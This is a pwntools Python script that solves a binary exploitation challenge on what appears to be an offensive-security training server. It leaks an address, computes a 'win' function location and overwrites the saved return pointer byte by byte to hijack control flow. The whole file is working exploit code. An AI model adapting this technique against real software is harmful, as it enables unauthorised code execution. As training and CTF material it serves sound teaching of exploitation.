from pwn import *
import time

p = remote("bin.training.offdef.it", 4202)

# p = process("patched_ptr_protection")
# gdb.attach(p, '''
#            ''')

input()

after_sip_offset = 48

# jump in the main before call challenge
print("send offset")
p.sendline(b"40")

input()

print("send value")
p.sendline(b"80")

input("wait")
p.sendline(b"-1")

p.recvuntil(b"return ")
leak = p.recvline().strip()
leak = int(leak, 16)
print("leak: ", hex(leak))

win_offset = 0x368
win_addr = leak - win_offset

print("win_addr: ", hex(win_addr))

# divide win_addr in 6 bytes
win_addr_bytes = [win_addr >> i & 0xff for i in (0, 8, 16, 24, 32, 40)]
# transform the bytes in string representation of base 10 integer
win_addr_bytes = [str(x) for x in win_addr_bytes]

# write the win address after the saved ip
# we make a for in which we write the first byte at index 48, the second byte at index 49 and so on
for i in range(6):
    print("send index")
    p.sendline(str(after_sip_offset + i).encode())

    input()

    print("send value")
    p.sendline(win_addr_bytes[i].encode())

    input("wait")

# jump again in the main where there is the ret instruction
print("send offset")
p.sendline(b"40")

input()

print("send value")
p.sendline(b"137")

input("wait")
p.sendline(b"-1")

p.interactive()